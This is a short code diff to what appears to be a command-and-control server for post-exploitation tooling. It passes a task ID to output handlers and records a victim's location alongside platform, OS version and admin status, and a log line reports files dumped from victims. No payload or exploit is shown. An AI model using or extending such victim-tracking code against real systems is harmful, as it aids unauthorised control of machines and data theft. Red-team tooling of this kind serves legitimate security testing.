@@ -102,7 +102,7 @@ def main(mongoclient,server_logger,port):
 
 			
 			## Handling for various kind of tasks, also passing the task/module options set by user
-			output = Module.module_task_id[task_id].handle_task_output(request.data,Task.tasks[task_id].options,victim_id,)
+			output = Module.module_task_id[task_id].handle_task_output(request.data,Task.tasks[task_id].options,victim_id,task_id)
 
 			server_logger.info_log(f"Recieved task output for task ID - {task_id} , Victim ID - {victim_id} , Command - {cmd}, Output - {colored('File dumped to '+output.split('../../')[1],'cyan')} accessible both though host and container.",'green')
 
@@ -134,7 +134,7 @@ def main(mongoclient,server_logger,port):
 
 			if victim_id:
 				## instantiate a new victim object
-				victim_obj = Victim(victim_id = victim_id,platform = info['platform'],os_version = info['version'],admin = info['admin'])
+				victim_obj = Victim(victim_id = victim_id,platform = info['platform'],os_version = info['version'],admin = info['admin'],location= info['location'])
 
 
 				if victim_obj:
